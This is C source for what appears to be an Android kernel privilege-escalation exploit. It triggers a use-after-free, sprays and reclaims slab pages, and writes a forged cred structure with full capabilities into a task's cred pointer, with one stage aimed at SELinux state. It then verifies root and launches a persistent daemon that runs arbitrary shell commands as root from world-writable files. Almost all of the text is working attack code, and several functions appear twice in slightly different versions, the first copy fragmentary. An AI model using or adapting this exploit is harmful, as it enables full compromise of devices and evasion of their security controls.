 g_me=getpid();g_nleak=0;g_nalloc=0;
 pid_t pid=fork();
 if(pid==0){child_main();_exit(0);}

  siginfo_t si;int zombie=0;

  {int r=waitid(P_PID,pid,&si,WEXITED|WNOWAIT);

 dump_matches(tbuf," x: (",3);
 int etid=0;
 {char*save=0;
  for(char*line=strtok_r(tbuf,"\n",&save);line;line=strtok_r(NULL,"\n",&save)){
   int tid=0;char comm[32];
   if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
   if(strstr(line," fs: (")){unsigned long long sv=field_u64(line,"slab=");if(sv&&g_nfs<FSMAX)g_fs[g_nfs++]=sv;}
    if(strstr(line," tm: (")){unsigned long long v=field_u64(line,"a0=");if(v&&g_nleak<LEAKMAX)g_leak[g_nleak++]=(v|0xffffff0000000000ULL);}

     unsigned long long ts=field_u64(line,"ts="),h=field_u64(line,"h=");

   }
  }}
 if(!A||!TASK||!PTASK){printf("VERDICT NO_UAF_TRIGGER\n");benign_cleanup(pid,zombie);return 1;}

  ad2[0]=PTASK+0x908;g2=read_addrs(ad2,vv2,1);
  if(g2>0&&vv2[0]){g_cred=vv2[0];
   ad2[0]=g_cred+0x00;ad2[1]=g_cred+0x08;ad2[2]=g_cred+0x18;ad2[3]=g_cred+0x20;ad2[4]=g_cred+0x80;ad2[5]=g_cred+0x28;ad2[6]=g_cred+0x90;ad2[7]=g_cred+0x88;ad2[8]=g_cred+0x98;ad2[9]=g_cred+0xa0;
   g2=read_addrs(ad2,vv2,10);

   g_un=vv2[6];g_sec=vv2[4];g_usr=vv2[7];g_uc=vv2[8];g_gi=vv2[9];

     printf("SLIDE_CALC un=0x%llx slide=0x%llx align=%d\n",g_un,sl,algn);fflush(stdout);}
  } else {printf("CRED_LEAK_FAIL g=%d\n",g2);fflush(stdout);}
 }

 if(k>19||off+0x110ULL>0x1ec0ULL){printf("VERDICT BAD_OFFSET\n");benign_cleanup(pid,zombie);return 1;}
  {int nv=0,nld=0;unsigned long long spv=sp_of(PAGE);
   char*seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);

     for(int j=0;j<g_nleak&&j<LEAKMAX;j++){if(!seen[j]&&sp_of(g_leak[j])==sp){seen[j]=1;nld++;break;}}}
   free(seen);
   printf("W1FS fs=%d victim=%d leakpages=%d nleak=%d\n",g_nfs,nv,nld,g_nleak);fflush(stdout);}
   if(g_churn>0){
   pin(0);
   printf("CHURN start slabs=%d n=%d\n",slab_slabs(),g_churn);fflush(stdout);
   timer_t *chtt=(timer_t*)malloc(sizeof(timer_t)*(size_t)g_churn);
   int ncc=0;
   if(chtt){struct sigevent chse;memset(&chse,0,sizeof chse);chse.sigev_notify=SIGEV_NONE;
   for(int ci=0;ci<g_churn;ci++){if(timer_create(CLOCK_MONOTONIC,&chse,&chtt[ci])==0)ncc++;}
   printf("CHURN created=%d slabs=%d\n",ncc,slab_slabs());fflush(stdout);
   for(int ci=0;ci<ncc;ci++)timer_delete(chtt[ci]);
   free(chtt);}
   printf("CHURN deleted slabs=%d\n",slab_slabs());fflush(stdout);
   msleep(g_chwait);
   printf("CHURN afterwait slabs=%d\n",slab_slabs());fflush(stdout);
 }
  mk=0x1a00ULL;MARK=PAGE+mk;
 S=PTASK+0x908;
printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx\n",g_fakekva,MARK,S);fflush(stdout);
 fill_fake_cred(N);
 build_pattern();
  int hit=0;
  printf("km8k_before=%d posix_before=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  printf("DBG3 leaks=%d delay=%d mode=%d pairs=%d\n",g_nleak,g_delay,g_mode,g_pairs);fflush(stdout);
  probe_on_r("t32","al","__alloc_frozen_pages_noprof page=$retval:x64");
  printf("cpu_before=%d\n",sched_getcpu());fflush(stdout);
  probe_on("t32","fs","free_slab cache=%x0:x64 slab=%x1:x64");
  {trunc_trace();wf(TR"/tracing_on","1\n");msleep(g_delay);wf(TR"/tracing_on","0\n");
   size_t tf=read_trace(tbuf,48u<<20);
   {char*s3=0;int nfs=0,nl=0,nv=0;unsigned long long spv0=sp_of(PAGE);
    char *seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
    for(char*line=strtok_r(tbuf,"\n",&s3);line;line=strtok_r(NULL,"\n",&s3)){
      if(strstr(line," fs: (")){unsigned long long sp=field_u64(line,"slab=");if(!sp)continue;nfs++;
        if(sp==spv0)nv++;
        for(int i=0;i<g_nleak&&i<LEAKMAX;i++){if(!seen[i]&&sp_of(g_leak[i])==sp){seen[i]=1;nl++;break;}}
      }
    }
    printf("FREESLAB nfs=%d leakpages=%d victim_fs=%d bytes=%zu\n",nfs,nl,nv,tf);fflush(stdout);
    free(seen);}
  }
  {printf("cpu_after=%d\n",sched_getcpu());fflush(stdout);
   g_nalloc=0;
   trunc_trace();wf(TR"/tracing_on","1\n");
   for(int rp=0;rp<g_reps;rp++){if(g_mode==0)spray_one();else spray_cpus(0,nsv);}
   wf(TR"/tracing_on","0\n");
   size_t tl=read_trace(tbuf,48u<<20);
   {char*s2=0;for(char*line=strtok_r(tbuf,"\n",&s2);line;line=strtok_r(NULL,"\n",&s2)){
      int tid=0;char comm[32];
      if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
      if(strncmp(comm,"yt2-parent",10))continue;
      if(strstr(line," al: (")){unsigned long long v=field_u64(line,"page=");if(v&&g_nalloc<ALMAX)g_alloc[g_nalloc++]=v;}
   }}
   printf("BURST sent=%d alloc=%d bytes=%zu\n",nsv,g_nalloc,tl);fflush(stdout);
   hit=detect_hit();
   {int lim=g_nleak<512?g_nleak:512;int vm=0,lm=0;unsigned long long spv=sp_of(A);
    for(int j=0;j<g_nalloc;j++){
      if(g_alloc[j]==spv)vm++;
      for(int i=0;i<lim;i++){if(g_alloc[j]==sp_of(g_leak[i])){lm++;break;}}
    }
    printf("ALLOCSTAT ours=%d victim_match=%d leak_match=%d leak_sample=%d\n",g_nalloc,vm,lm,lim);fflush(stdout);}
  }
  printf("km8k_after=%d posix_after=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  int hit2=hit;(void)hit2;
  if(hit)printf("HIT pages=%ld\n",ppages);
  else printf("miss pages=%ld\n",ppages);fflush(stdout);
 { unsigned long long ad[3],vv[3];int n=0;ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=A+0x100;
   int g=read_addrs(ad,vv,n);
   if(g>0){printf("post rb_node=0x%llx next=0x%llx n100=0x%llx\n",vv[0],vv[1],vv[2]);
     if(vv[1]!=N){printf("VERDICT NO_STALE_LINK\n");benign_cleanup(pid,zombie);return 1;}}
   else printf("post read got=%d\n",g); }
  { unsigned long long ad[10],vv[10];int n=0;
    ad[n++]=PAGE;ad[n++]=PAGE+0x100;ad[n++]=PAGE+0x400;ad[n++]=PAGE+0x800;ad[n++]=PAGE+0x1000;ad[n++]=PAGE+0x1800;ad[n++]=PAGE+0x1a00;ad[n++]=PAGE+0x1c00;ad[n++]=A;ad[n++]=A+0x38;
    int g=read_addrs(ad,vv,n);printf("page dump got=%d\n",g);
    if(g>0)for(int k=0;k<n;k++)printf("  D[%d] +0x%llx = 0x%llx\n",k,ad[k]-PAGE,vv[k]);
    printf("SP=0x%llx\n",(0xfffffffec0000000ULL+(((PAGE-0xffffff8000000000ULL)>>12)*0x40ULL)));fflush(stdout);}
 if(!hit){printf("VERDICT NO_RECLAIM\n");benign_cleanup(pid,zombie);return 1;}
 printf("FAKE_TREE_ARMED att=%d pages=%ld\n",att,ppages);fflush(stdout);
 *outpid=pid;return 0;
}
/* ---------- reap: trigger stale-node zero write, verify ---------- */
static void run_sh(const char*cmd,const char*outpath,int waitms){
 pid_t c=fork();
 if(c==0){int fd=open(outpath,O_WRONLY|O_CREAT|O_TRUNC,0666);if(fd>=0){dup2(fd,1);dup2(fd,2);close(fd);}
   execl("/system/bin/sh","sh","-c",cmd,(char*)0);_exit(127);}
 if(c>0){for(int i=0;i<waitms/50;i++){int st;pid_t r=waitpid(c,&st,WNOHANG);if(r==c)break;msleep(50);}}
}
static void read_file_print(const char*path,const char*tag){
 char b[4096];int n=0;int fd=open(path,O_RDONLY);if(fd>=0){n=(int)read(fd,b,sizeof b-1);close(fd);}if(n<0)n=0;b[n]=0;
 printf("%s:[%s]\n",tag,b);fflush(stdout);
}
static void rootd_main(void){
 {int lf=open("/data/local/tmp/t32_rootd.log",O_WRONLY|O_CREAT|O_APPEND,0666);if(lf>=0){dup2(lf,1);dup2(lf,2);close(lf);}}
 printf("ROOTD start pid=%d uid=%d euid=%d\n",(int)getpid(),(int)getuid(),(int)geteuid());fflush(stdout);
 {int f=open("/data/local/tmp/t32_rootd.ready",O_WRONLY|O_CREAT|O_TRUNC,0666);
  if(f>=0){dprintf(f,"pid=%d uid=%d euid=%d\n",(int)getpid(),(int)getuid(),(int)geteuid());close(f);}
  chmod("/data/local/tmp/t32_rootd.ready",0666);}
 long last=0;
 for(;;){
  msleep(200);
  long seq=0;char b[64]={0};
  {int f=open("/data/local/tmp/t32_rootd.seq",O_RDONLY);if(f<0)continue;int rn=(int)read(f,b,63);close(f);if(rn<=0)continue;seq=atol(b);}
  if(seq<=last)continue;
  char cmd[1024]={0};int rn=0;
  {int f=open("/data/local/tmp/t32_rootd.cmd",O_RDONLY);if(f<0)continue;rn=(int)read(f,cmd,sizeof cmd-1);close(f);}
  if(rn<=0)continue;
  last=seq;
  run_sh(cmd,"/data/local/tmp/t32_rootd.out",15000);
  {int f=open("/data/local/tmp/t32_rootd.done",O_WRONLY|O_CREAT|O_TRUNC,0666);if(f>=0){dprintf(f,"%ld\n",seq);close(f);}chmod("/data/local/tmp/t32_rootd.done",0666);}
 }
}
static void rootd_cmd(const char*cmd,long seq){
 {int f=open("/data/local/tmp/t32_rootd.cmd",O_WRONLY|O_CREAT|O_TRUNC,0666);if(f>=0){ssize_t w=write(f,cmd,strlen(cmd));(void)w;close(f);}chmod("/data/local/tmp/t32_rootd.cmd",0666);}
 {int f=open("/data/local/tmp/t32_rootd.seq",O_WRONLY|O_CREAT|O_TRUNC,0666);if(f>=0){dprintf(f,"%ld\n",seq);close(f);}chmod("/data/local/tmp/t32_rootd.seq",0666);}
 for(int i=0;i<80;i++){long d=0;int f=open("/data/local/tmp/t32_rootd.done",O_RDONLY);if(f>=0){char b[32]={0};int rn=(int)read(f,b,31);close(f);if(rn>0)d=atol(b);}
  if(d==seq)break;msleep(100);}
}
static void rootd_start(void){
 pid_t c=fork();
 if(c==0){execl(g_self,"t32","--rootd",(char*)0);_exit(127);}
 printf("ROOTD fork=%d self=%s\n",(int)c,g_self);fflush(stdout);

}
static void root_proof(void){
 printf("== ROOT PROOF\n");fflush(stdout);
 run_sh("id; echo ---; grep -E '^(Uid|Gid|CapEff|CapPrm|CapBnd):' /proc/self/status; echo ---; getenforce; echo ---; cat /proc/sys/kernel/random/boot_id","/data/local/tmp/t32_proof.txt",4000);
 read_file_print("/data/local/tmp/t32_proof.txt","PROOFFILE");
}
static void reap_calib(pid_t pid){
 printf("== reap window\n");fflush(stdout);
 trunc_trace();wf(TR"/tracing_on","1\n");
 int st=0;pid_t wr=waitpid(pid,&st,0);

 wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 printf("waitpid=%d status=%d trace=%zu REPAIRED\n",(int)wr,st,tlen);fflush(stdout);
 {unsigned long long ad[12],vv[12];int n=0;
  ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva+0x00;ad[n++]=g_fakekva+0x08;ad[n++]=g_fakekva+0x10;ad[n++]=g_fakekva+0x18;ad[n++]=g_fakekva+0x20;ad[n++]=g_fakekva+0x38;ad[n++]=g_fakekva+0x40;ad[n++]=g_fakekva+0x80;
  int g=read_addrs(ad,vv,n);
  printf("post got=%d\n",g);
  if(g>0){for(int k=0;k<n;k++)printf("  P[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   int ok=(vv[0]==g_fakekva);
   printf("CREDPTR target=0x%llx val=0x%llx %s\n",ad[0],vv[0],ok?"PTR_OK":"PTR_FAIL");
   printf("FAKECRED usage=0x%llx uidgid=0x%llx suid=0x%llx euid=0x%llx fsuid=0x%llx capP=0x%llx capE=0x%llx sec=0x%llx\n",vv[2],vv[3],vv[4],vv[5],vv[6],vv[7],vv[8],vv[9]);
   if(ok)g_armed=1;
  }
 }
 printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());
 {struct __user_cap_header_struct hh;struct __user_cap_data_struct dd[2];memset(dd,0,sizeof dd);hh.version=_LINUX_CAPABILITY_VERSION_3;hh.pid=0;
  int cr=(int)syscall(SYS_capget,&hh,dd);
  printf("CAPGET r=%d eff0=0x%x eff1=0x%x prm1=0x%x bnd1=0x%x\n",cr,dd[0].effective,dd[1].effective,dd[1].permitted,dd[1].inheritable);fflush(stdout);}
 if(g_armed){root_proof();rootd_start();rootd_cmd("id; echo ---; grep -E '^(Uid|Gid|CapEff):' /proc/self/status; echo ---; getenforce",1);read_file_print("/data/local/tmp/t32_rootd.out","ROOTD_OUT");}
 close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
}
static void perf_prepare(void){
 trunc_trace();
 probe_on_r("t32p","rb","rb_alloc user_page=+0x118($retval):x64");
 trunc_trace();wf(TR"/tracing_on","1\n");
 struct perf_event_attr pe;memset(&pe,0,sizeof pe);
 pe.type=PERF_TYPE_SOFTWARE;pe.size=sizeof(pe);pe.config=PERF_COUNT_SW_CPU_CLOCK;pe.disabled=1;pe.exclude_kernel=1;pe.exclude_hv=1;
 int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
 void*mp=0; if(fd>=0)mp=mmap(0,4096,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
 wf(TR"/tracing_on","0\n");

 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=g_fakekva; q[1]=0; q[2]=naddr; q[3]=0;
  if(g_stage==0){q[0x108/8]=naddr;q[0x110/8]=naddr;}
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 q[0x80/8]=g_sec;q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}
static void repair_fake_cred(void){
 if(!g_pmap)return;
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=0x100000; q[1]=0; q[2]=0; q[3]=0; q[4]=0;
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 q[0x80/8]=g_sec;q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}


/* ---------- attempt: UAF trigger + 8K victim page reclaim ---------- */
static int do_attempt(int att, pid_t *outpid){
 A=TASK=PTASK=0; close_skb(); int slabs0=slab_slabs();
 printf("== attempt %d slabs0=%d\n",att,slabs0);fflush(stdout);
 unpin0();
 {int np=precreate_pairs(g_pairs);printf("pairs=%d\n",np);fflush(stdout);}
 trunc_trace();wf(TR"/tracing_on","1\n");
 prctl(PR_SET_NAME,"yt2-parent",0,0,0);
 g_me=getpid();g_nleak=0;g_nalloc=0;
 pid_t pid=fork();
 if(pid==0){child_main();_exit(0);}
 if(pid<0){printf("fork fail %d\n",errno);wf(TR"/tracing_on","0\n");return 1;}
  siginfo_t si;int zombie=0;
  memset(&si,0,sizeof si);
  {int r=waitid(P_PID,pid,&si,WEXITED|WNOWAIT);
   if(r==0&&si.si_pid==pid)zombie=1;}
 wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 printf("zombie=%d trace=%zu\n",zombie,tlen);fflush(stdout);
 printf("DBG x=%d tm=%d fr=%d ei=%d rl=%d td=%d pe=%d\n",count_sub(tbuf," x: ("),count_sub(tbuf," tm: ("),count_sub(tbuf," fr: ("),count_sub(tbuf," ei: ("),count_sub(tbuf," rl: ("),count_sub(tbuf," td: ("),count_sub(tbuf," pe: ("));
 dump_matches(tbuf," x: (",3);
 int etid=0;
 {char*save=0;
  for(char*line=strtok_r(tbuf,"\n",&save);line;line=strtok_r(NULL,"\n",&save)){
   int tid=0;char comm[32];
   if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
   if(strstr(line," fs: (")){unsigned long long sv=field_u64(line,"slab=");if(sv&&g_nfs<FSMAX)g_fs[g_nfs++]=sv;}
    if(strstr(line," tm: (")){unsigned long long v=field_u64(line,"a0=");if(v&&g_nleak<LEAKMAX)g_leak[g_nleak++]=(v|0xffffff0000000000ULL);}
    if(strstr(line,"x: (")){
     unsigned long long ts=field_u64(line,"ts="),h=field_u64(line,"h=");
     if(h&&!A&&!strncmp(comm,"yt-exec",7)){A=h-0xe0;TASK=ts;etid=tid;}
     if(ts&&tid==(int)g_me)PTASK=ts;
   }
  }}
 if(!A||!TASK||!PTASK){printf("VERDICT NO_UAF_TRIGGER\n");benign_cleanup(pid,zombie);return 1;}
 printf("A=0x%llx TASK=0x%llx PTASK=0x%llx etid=%d\n",A,TASK,PTASK,etid);fflush(stdout);
 PAGE=A&~0x1fffULL;off=A&0x1fffULL;N=A+0xe0;
 int k=(int)(off/0x180);
 printf("PAGE=0x%llx off=0x%llx k=%d N=0x%llx\n",PAGE,off,k,N); if(!g_cred){
  unsigned long long ad2[12],vv2[12];int g2=0;
  ad2[0]=PTASK+0x908;g2=read_addrs(ad2,vv2,1);
  if(g2>0&&vv2[0]){g_cred=vv2[0];
   ad2[0]=g_cred+0x00;ad2[1]=g_cred+0x08;ad2[2]=g_cred+0x18;ad2[3]=g_cred+0x20;ad2[4]=g_cred+0x80;ad2[5]=g_cred+0x28;ad2[6]=g_cred+0x90;ad2[7]=g_cred+0x88;ad2[8]=g_cred+0x98;ad2[9]=g_cred+0xa0;
   g2=read_addrs(ad2,vv2,10);
   printf("CRED cred=0x%llx usage=%llu uid=%llu euid=%llu fsuid=%llu sec=0x%llx sb=0x%llx un=0x%llx user=0x%llx uc=0x%llx gi=0x%llx\n",g_cred,vv2[0],vv2[1],vv2[2],vv2[3],vv2[4],vv2[5],vv2[6],vv2[7],vv2[8],vv2[9]);fflush(stdout);
   g_un=vv2[6];g_sec=vv2[4];g_usr=vv2[7];g_uc=vv2[8];g_gi=vv2[9];
   if(g_un){unsigned long long sl=g_un-INIT_USER_NS_STATIC;int algn=(int)((sl&0x1fffffULL)==0);
     printf("SLIDE_CALC un=0x%llx slide=0x%llx align=%d\n",g_un,sl,algn);fflush(stdout);}
  } else {printf("CRED_LEAK_FAIL g=%d\n",g2);fflush(stdout);}
 }

 if(!g_fakekva){printf("VERDICT NO_FAKEPAGE\n");benign_cleanup(pid,zombie);return 1;}
 if(k>19||off+0x110ULL>0x1ec0ULL){printf("VERDICT BAD_OFFSET\n");benign_cleanup(pid,zombie);return 1;}
  {int nv=0,nld=0;unsigned long long spv=sp_of(PAGE);
   char*seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
   for(int i=0;i<g_nfs;i++){unsigned long long sp=g_fs[i];if(sp==spv)nv++;
     for(int j=0;j<g_nleak&&j<LEAKMAX;j++){if(!seen[j]&&sp_of(g_leak[j])==sp){seen[j]=1;nld++;break;}}}
   free(seen);
   printf("W1FS fs=%d victim=%d leakpages=%d nleak=%d\n",g_nfs,nv,nld,g_nleak);fflush(stdout);}
   if(g_churn>0){
   pin(0);
   printf("CHURN start slabs=%d n=%d\n",slab_slabs(),g_churn);fflush(stdout);
   timer_t *chtt=(timer_t*)malloc(sizeof(timer_t)*(size_t)g_churn);
   int ncc=0;
   if(chtt){struct sigevent chse;memset(&chse,0,sizeof chse);chse.sigev_notify=SIGEV_NONE;
   for(int ci=0;ci<g_churn;ci++){if(timer_create(CLOCK_MONOTONIC,&chse,&chtt[ci])==0)ncc++;}
   printf("CHURN created=%d slabs=%d\n",ncc,slab_slabs());fflush(stdout);
   for(int ci=0;ci<ncc;ci++)timer_delete(chtt[ci]);
   free(chtt);}
   printf("CHURN deleted slabs=%d\n",slab_slabs());fflush(stdout);
   msleep(g_chwait);
   printf("CHURN afterwait slabs=%d\n",slab_slabs());fflush(stdout);
 }
  mk=0x1a00ULL;MARK=PAGE+mk;
  if(g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=g_sel; } else S=PTASK+0x908;
printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
 fill_fake_cred(N);
 build_pattern();
  int hit=0;
  printf("km8k_before=%d posix_before=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  printf("DBG3 leaks=%d delay=%d mode=%d pairs=%d\n",g_nleak,g_delay,g_mode,g_pairs);fflush(stdout);
  probe_on_r("t34","al","__alloc_frozen_pages_noprof page=$retval:x64");
  printf("cpu_before=%d\n",sched_getcpu());fflush(stdout);
  probe_on("t34","fs","free_slab cache=%x0:x64 slab=%x1:x64");
  {trunc_trace();wf(TR"/tracing_on","1\n");msleep(g_delay);wf(TR"/tracing_on","0\n");
   size_t tf=read_trace(tbuf,48u<<20);
   {char*s3=0;int nfs=0,nl=0,nv=0;unsigned long long spv0=sp_of(PAGE);
    char *seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
    for(char*line=strtok_r(tbuf,"\n",&s3);line;line=strtok_r(NULL,"\n",&s3)){
      if(strstr(line," fs: (")){unsigned long long sp=field_u64(line,"slab=");if(!sp)continue;nfs++;
        if(sp==spv0)nv++;
        for(int i=0;i<g_nleak&&i<LEAKMAX;i++){if(!seen[i]&&sp_of(g_leak[i])==sp){seen[i]=1;nl++;break;}}
      }
    }
    printf("FREESLAB nfs=%d leakpages=%d victim_fs=%d bytes=%zu\n",nfs,nl,nv,tf);fflush(stdout);
    free(seen);}
  }
  {printf("cpu_after=%d\n",sched_getcpu());fflush(stdout);
   g_nalloc=0;
   trunc_trace();wf(TR"/tracing_on","1\n");
   for(int rp=0;rp<g_reps;rp++){if(g_mode==0)spray_one();else spray_cpus(0,nsv);}
   wf(TR"/tracing_on","0\n");
   size_t tl=read_trace(tbuf,48u<<20);
   {char*s2=0;for(char*line=strtok_r(tbuf,"\n",&s2);line;line=strtok_r(NULL,"\n",&s2)){
      int tid=0;char comm[32];
      if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
      if(strncmp(comm,"yt2-parent",10))continue;
      if(strstr(line," al: (")){unsigned long long v=field_u64(line,"page=");if(v&&g_nalloc<ALMAX)g_alloc[g_nalloc++]=v;}
   }}
   printf("BURST sent=%d alloc=%d bytes=%zu\n",nsv,g_nalloc,tl);fflush(stdout);
   hit=detect_hit();
   {int lim=g_nleak<512?g_nleak:512;int vm=0,lm=0;unsigned long long spv=sp_of(A);
    for(int j=0;j<g_nalloc;j++){
      if(g_alloc[j]==spv)vm++;
      for(int i=0;i<lim;i++){if(g_alloc[j]==sp_of(g_leak[i])){lm++;break;}}
    }
    printf("ALLOCSTAT ours=%d victim_match=%d leak_match=%d leak_sample=%d\n",g_nalloc,vm,lm,lim);fflush(stdout);}
  }
  printf("km8k_after=%d posix_after=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  int hit2=hit;(void)hit2;
  if(hit)printf("HIT pages=%ld\n",ppages);
  else printf("miss pages=%ld\n",ppages);fflush(stdout);
 { unsigned long long ad[3],vv[3];int n=0;ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=A+0x100;
   int g=read_addrs(ad,vv,n);
   if(g>0){printf("post rb_node=0x%llx next=0x%llx n100=0x%llx\n",vv[0],vv[1],vv[2]);
     if(vv[1]!=N){printf("VERDICT NO_STALE_LINK\n");benign_cleanup(pid,zombie);return 1;}}
   else printf("post read got=%d\n",g); }
  { unsigned long long ad[10],vv[10];int n=0;
    ad[n++]=PAGE;ad[n++]=PAGE+0x100;ad[n++]=PAGE+0x400;ad[n++]=PAGE+0x800;ad[n++]=PAGE+0x1000;ad[n++]=PAGE+0x1800;ad[n++]=PAGE+0x1a00;ad[n++]=PAGE+0x1c00;ad[n++]=A;ad[n++]=A+0x38;
    int g=read_addrs(ad,vv,n);printf("page dump got=%d\n",g);
    if(g>0)for(int k=0;k<n;k++)printf("  D[%d] +0x%llx = 0x%llx\n",k,ad[k]-PAGE,vv[k]);
    printf("SP=0x%llx\n",(0xfffffffec0000000ULL+(((PAGE-0xffffff8000000000ULL)>>12)*0x40ULL)));fflush(stdout);}
 if(!hit){printf("VERDICT NO_RECLAIM\n");benign_cleanup(pid,zombie);return 1;}
 printf("FAKE_TREE_ARMED att=%d pages=%ld\n",att,ppages);fflush(stdout);
 *outpid=pid;return 0;
}
/* ---------- reap: trigger stale-node zero write, verify ---------- */
static void run_sh(const char*cmd,const char*outpath,int waitms){
 pid_t c=fork();
 if(c==0){int fd=open(outpath,O_WRONLY|O_CREAT|O_TRUNC,0666);if(fd>=0){dup2(fd,1);dup2(fd,2);close(fd);}
   execl("/system/bin/sh","sh","-c",cmd,(char*)0);_exit(127);}
 if(c>0){for(int i=0;i<waitms/50;i++){int st;pid_t r=waitpid(c,&st,WNOHANG);if(r==c)break;msleep(50);}}
}
static void read_file_print(const char*path,const char*tag){
 char b[4096];int n=0;int fd=open(path,O_RDONLY);if(fd>=0){n=(int)read(fd,b,sizeof b-1);close(fd);}if(n<0)n=0;b[n]=0;
 printf("%s:[%s]\n",tag,b);fflush(stdout);
}
static void rootd_main(void){
 {int lf=open("/data/local/tmp/t34_rootd.log",O_WRONLY|O_CREAT|O_APPEND,0666);if(lf>=0){dup2(lf,1);dup2(lf,2);close(lf);}}
 printf("ROOTD start pid=%d uid=%d euid=%d\n",(int)getpid(),(int)getuid(),(int)geteuid());fflush(stdout);
 {int f=open("/data/local/tmp/t34_rootd.ready",O_WRONLY|O_CREAT|O_TRUNC,0666);
  if(f>=0){dprintf(f,"pid=%d uid=%d euid=%d\n",(int)getpid(),(int)getuid(),(int)geteuid());close(f);}
  chmod("/data/local/tmp/t34_rootd.ready",0666);}
 long last=0;
 for(;;){
  msleep(200);
  long seq=0;char b[64]={0};
  {int f=open("/data/local/tmp/t34_rootd.seq",O_RDONLY);if(f<0)continue;int rn=(int)read(f,b,63);close(f);if(rn<=0)continue;seq=atol(b);}
  if(seq<=last)continue;
  char cmd[1024]={0};int rn=0;
  {int f=open("/data/local/tmp/t34_rootd.cmd",O_RDONLY);if(f<0)continue;rn=(int)read(f,cmd,sizeof cmd-1);close(f);}
  if(rn<=0)continue;
  last=seq;
  run_sh(cmd,"/data/local/tmp/t34_rootd.out",15000);
  {int f=open("/data/local/tmp/t34_rootd.done",O_WRONLY|O_CREAT|O_TRUNC,0666);if(f>=0){dprintf(f,"%ld\n",seq);close(f);}chmod("/data/local/tmp/t34_rootd.done",0666);}
 }
}
static void rootd_cmd(const char*cmd,long seq){
 {int f=open("/data/local/tmp/t34_rootd.cmd",O_WRONLY|O_CREAT|O_TRUNC,0666);if(f>=0){ssize_t w=write(f,cmd,strlen(cmd));(void)w;close(f);}chmod("/data/local/tmp/t34_rootd.cmd",0666);}
 {int f=open("/data/local/tmp/t34_rootd.seq",O_WRONLY|O_CREAT|O_TRUNC,0666);if(f>=0){dprintf(f,"%ld\n",seq);close(f);}chmod("/data/local/tmp/t34_rootd.seq",0666);}
 for(int i=0;i<80;i++){long d=0;int f=open("/data/local/tmp/t34_rootd.done",O_RDONLY);if(f>=0){char b[32]={0};int rn=(int)read(f,b,31);close(f);if(rn>0)d=atol(b);}
  if(d==seq)break;msleep(100);}
}
static void rootd_start(void){
 pid_t c=fork();
 if(c==0){execl(g_self,"t34","--rootd",(char*)0);_exit(127);}
 printf("ROOTD fork=%d self=%s\n",(int)c,g_self);fflush(stdout);
 for(int i=0;i<30;i++){if(access("/data/local/tmp/t34_rootd.ready",F_OK)==0)break;msleep(100);}
}
static void root_proof(void){
 printf("== ROOT PROOF\n");fflush(stdout);
 run_sh("id; echo ---; grep -E '^(Uid|Gid|CapEff|CapPrm|CapBnd):' /proc/self/status; echo ---; getenforce; echo ---; cat /proc/sys/kernel/random/boot_id","/data/local/tmp/t34_proof.txt",4000);
 read_file_print("/data/local/tmp/t34_proof.txt","PROOFFILE");
}
static void reap_calib(pid_t pid){
 printf("== reap window stage=%d\n",g_stage);fflush(stdout);
 trunc_trace();wf(TR"/tracing_on","1\n");
 int st=0;pid_t wr=waitpid(pid,&st,0);
 repair_fake_cred();
 wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 printf("waitpid=%d status=%d trace=%zu\n",(int)wr,st,tlen);fflush(stdout);
 if(g_stage==0){
  unsigned long long ad[6],vv[6];int n=0;
  ad[n++]=g_sel;ad[n++]=g_sel+0x08;ad[n++]=g_sel+0x40;ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva;
  int g=read_addrs(ad,vv,n);
  printf("SELREAD got=%d\n",g);fflush(stdout);
  if(g>0){int k;
   for(k=0;k<n;k++)printf("  Q[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   {unsigned long long ex=g_fakekva|0x100ULL;
